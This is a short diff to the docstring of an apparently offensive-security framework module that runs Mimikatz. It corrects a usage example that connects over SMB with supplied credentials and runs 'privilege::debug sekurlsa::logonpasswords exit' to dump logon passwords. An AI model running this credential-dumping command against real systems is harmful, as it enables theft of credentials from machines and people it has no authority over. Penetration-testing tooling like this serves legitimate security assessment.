@@ -27,7 +27,7 @@ class CMXModule:
     Module Options:
            COMMAND  Mimikatz command to execute (default: 'privilege::debug sekurlsa::logonpasswords exit')
 
-cmx --verbose smb 192.168.1.1 -u username -p password -M mimikatz -mo 'privilege::debug sekurlsa::logonpasswords exit'
+cmx --verbose smb 192.168.1.1 -u username -p password -M mimikatz -mo COMMAND='privilege::debug sekurlsa::logonpasswords exit'
 
         """
         self.command = 'privilege::debug sekurlsa::logonpasswords exit'
